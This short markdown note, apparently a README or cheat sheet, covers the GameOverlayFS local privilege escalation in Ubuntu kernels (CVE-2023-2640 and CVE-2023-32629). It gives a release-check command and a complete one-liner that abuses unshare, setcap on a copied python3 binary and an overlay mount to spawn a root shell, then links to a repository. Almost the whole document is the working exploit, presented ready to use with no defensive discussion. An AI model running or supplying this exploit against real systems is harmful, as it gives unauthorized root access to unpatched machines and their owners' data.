# GameoverlayFS kernel exploit (CVE-2023-2640 and CVE-2023-32629)

## Steps:

    lsb_release -a (Check for the release version. If it is the "Jammy" release, it is most likely affected by the vulnerability)

## One liner to gain root:

    unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'

## Github repo: https://github.com/luanoliveira350/GameOverlayFS
